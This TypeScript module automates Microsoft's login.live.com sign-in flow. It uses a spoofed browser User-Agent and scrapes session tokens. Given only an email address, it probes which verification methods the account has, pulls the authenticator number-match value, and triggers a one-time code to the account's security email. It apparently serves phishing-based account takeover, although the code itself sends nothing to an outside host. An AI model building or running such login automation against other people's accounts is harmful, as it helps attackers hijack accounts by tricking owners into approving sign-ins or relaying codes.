// Simple cookie jar for maintaining session across requests
export class CookieJar {
  private cookies = new Map<string, string>();

  setFromResponse(res: Response) {
    const h = res.headers.get("set-cookie");
    if (!h) return;
    for (const entry of h.split(",")) {
      const parts = entry.split(";")[0].trim();
      const eqIdx = parts.indexOf("=");
      if (eqIdx === -1) continue;
      this.cookies.set(parts.slice(0, eqIdx).trim(), parts.slice(eqIdx + 1));
    }
  }

  getHeader(): string {
    return Array.from(this.cookies.entries())
      .map(([k, v]) => `${k}=${v}`)
      .join("; ");
  }
}

export async function fetchWithJar(
  jar: CookieJar,
  url: string,
  init: RequestInit = {},
): Promise<Response> {
  const headers = new Headers(init.headers);
  const jarCookies = jar.getHeader();
  if (jarCookies) {
    const existing = headers.get("cookie");
    if (!existing) headers.set("cookie", jarCookies);
  }

  const res = await fetch(url, { ...init, headers, redirect: "manual" });
  jar.setFromResponse(res);

  if (res.status >= 301 && res.status <= 308) {
    const loc = res.headers.get("location");
    if (loc) {
      const redirectUrl = new URL(loc, url).toString();
      return fetchWithJar(jar, redirectUrl, {
        method: "GET",
        headers: { cookie: jar.getHeader() },
      });
    }
  }

  return res;
}

export type AuthMethodInfo =
  | { method: "authenticator"; entropy: string; deviceFlowToken: string }
  | { method: "email_otp"; securityEmail: string; flowToken: string }
  | { method: "none"; detail?: string };

interface LiveData {
  urlPost: string;
  ppft: string;
}

function extractValue(text: string, pattern: RegExp): string | null {
  const m = pattern.exec(text);
  return m ? m[1] : null;
}

function decodeUnicodeEscapes(s: string): string {
  return s.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16)),
  );
}

/** POST to login.live.com to get PPFT and urlPost */
export async function getLiveData(jar?: CookieJar): Promise<LiveData> {
  const useJar = jar ?? new CookieJar();
  const res = await fetchWithJar(useJar, "https://login.live.com", {
    method: "POST",
    headers: {
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
      Accept:
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.9",
    },
  });
  const text = await res.text();

  const urlPost = extractValue(
    text,
    /https:\/\/login\.live\.com\/ppsecure\/post\.srf\?contextid=[0-9a-zA-Z]{1,100}&opid=[0-9a-zA-Z]{1,100}&bk=[a-zA-Z0-9]{1,100}&uaid=[0-9a-zA-Z]{1,100}&pid=0/,
  );
  if (!urlPost) throw new Error("Failed to extract urlPost from login.live.com");

  const ppftMatch = extractValue(text, /value=\\?"([^"]+)"/);
  if (!ppftMatch) throw new Error("Failed to extract PPFT from login.live.com");

  return { urlPost, ppft: ppftMatch };
}

/** Send auth request to Microsoft to check available verification methods */
export async function sendAuth(email: string): Promise<{
  credentials: Record<string, unknown> | null;
  raw: Record<string, unknown>;
}> {
  const res = await fetch("https://login.live.com/GetCredentialType.srf", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json; charset=utf-8",
      Referer: "https://login.live.com/",
      "User-Agent":
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    },
    body: JSON.stringify({
      checkPhones: true,
      country: "",
      federationFlags: 3,
      flowToken:
        "-DgAlkPotvHRxxasQViSq!n6!RCUSpfUm9bdVClpM6KR98HGq7plohQHfFANfGn4P7PN2GnUuAtn6Nu3dwU!Tisic5PrgO7w8Rn*LCKKQhcTDUPMM2QJJdjr4QkcdUXmPnuK!JOqW7GdIx3*icazjg5ZaS8w1ily5GLFRwdvobIOBDZP11n4dWICmPafkNpj5fKAMg3!ZY2EhKB7pVJ8ir4A$",
      forceotclogin: true,
      isCookieBannerShown: true,
      isExternalFederationDisallowed: true,
      isFederationDisabled: true,
      isFidoSupported: true,
      isOtherIdpSupported: false,
      isRemoteConnectSupported: false,
      isRemoteNGCSupported: true,
      isSignup: false,
      otclogindisallowed: false,
      username: email,
    }),
  });
  const data = (await res.json()) as Record<string, unknown>;
  const creds = (data?.Credentials as Record<string, unknown>) ?? null;
  return { credentials: creds, raw: data };
}

/** Detect which auth method is available for the account */
export function detectAuthMethod(
  credentials: Record<string, unknown> | null,
): AuthMethodInfo {
  if (!credentials) return { method: "none", detail: "No credentials returned" };

  if ("RemoteNgcParams" in credentials) {
    const ngc = credentials.RemoteNgcParams as Record<string, unknown>;
    const entropy =
      (ngc.Entropy as string) ??
      (ngc.SessionIdentifier as string) ??
      "unknown";
    const deviceFlowToken = (ngc.SessionIdentifier as string) ?? "";
    return { method: "authenticator", entropy, deviceFlowToken };
  }

  if ("OtcLoginEligibleProofs" in credentials) {
    const proofs = credentials.OtcLoginEligibleProofs as Array<Record<string, string>>;
    if (proofs && proofs.length > 0) {
      return {
        method: "email_otp",
        securityEmail: proofs[0].display ?? "unknown",
        flowToken: proofs[0].data ?? "",
      };
    }
    return { method: "none", detail: "No eligible proofs" };
  }

  return { method: "none", detail: "No auth methods available" };
}

/** Send OTP to the account's security email (maintains cookie session via jar) */
export async function sendOtt(
  jar: CookieJar,
  email: string,
  securityEmail: string,
): Promise<boolean> {
  try {
    const liveData = await getLiveData(jar);

    // Step 1: Submit email to start login flow
    const loginRes = await fetchWithJar(jar, liveData.urlPost, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.live.com",
        "Accept-Language": "en-US,en;q=0.5",
      },
      body: new URLSearchParams({
        ps: "2",
        PPFT: liveData.ppft,
        PPSX: "Pass",
        login: email,
        loginfmt: email,
        type: "11",
        passwd: "",
      }).toString(),
    });
    const loginText = await loginRes.text();

    // Step 2: Parse MFA page for proof list
    const actionMatch = loginText.match(/action="([^"]+)"/);
    if (!actionMatch) {
      console.error("[sendOtt] Failed to parse action URL");
      return false;
    }
    const action = actionMatch[1];

    const iptMatch = loginText.match(/name="ipt"[^>]+value="([^"]+)"/);
    const ppridMatch = loginText.match(/name="pprid"[^>]+value="([^"]+)"/);
    if (!iptMatch || !ppridMatch) {
      console.error("[sendOtt] Failed to parse ipt/pprid");
      return false;
    }
    const ipt = decodeURIComponent(iptMatch[1]);
    const pprid = ppridMatch[1];

    const identityRes = await fetchWithJar(jar, action, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        Origin: "https://login.live.com",
        "Accept-Language": "en-US,en;q=0.5",
      },
      body: new URLSearchParams({ pprid, ipt }).toString(),
    });
    const identityText = await identityRes.text();

    // Step 3: Extract proof list and API tokens
    const rawStrMatch = identityText.match(/"rawProofList"\s*:\s*"([^"]+)"/);
    if (!rawStrMatch) {
      console.error("[sendOtt] No rawProofList found");
      return false;
    }
    const rawJson = JSON.parse(
      decodeUnicodeEscapes(rawStrMatch[1]),
    ) as Array<Record<string, string>>;
    const epid =
      rawJson.find((p) => p.type === "Email" && p.epid)?.epid ?? rawJson[0]?.epid;
    if (!epid) {
      console.error("[sendOtt] No epid found");
      return false;
    }

    const apiCanary = decodeUnicodeEscapes(
      extractValue(identityText, /"apiCanary"\s*:\s*"([^"]+)"/) ?? "",
    );
    const eipt = decodeUnicodeEscapes(
      extractValue(identityText, /"eipt"\s*:\s*"([^"]+)"/) ?? "",
    );
    const uaid = extractValue(identityText, /"uaid"\s*:\s*"([^"]+)"/) ?? "";

    if (!apiCanary || !eipt || !uaid) {
      console.error("[sendOtt] Failed to extract API tokens");
      return false;
    }

    // Step 4: Send OTP
    const otpRes = await fetchWithJar(jar, "https://account.live.com/api/Proofs/SendOtt", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
        hpgid: "200368",
        scid: "100166",
        canary: apiCanary,
        eipt,
        uaid,
        uiflvr: "1001",
        hpgact: "0",
      },
      body: JSON.stringify({
        token: "",
        purpose: "UnfamiliarLocationHard",
        epid,
        autoVerification: false,
        autoVerificationFailed: false,
        confirmProof: securityEmail,
        uaid,
        uiflvr: 1001,
        scid: 100166,
        hpgid: 200368,
      }),
    });

    return otpRes.ok;
  } catch (e) {
    console.error("[sendOtt] Error:", e);
    return false;
  }
}
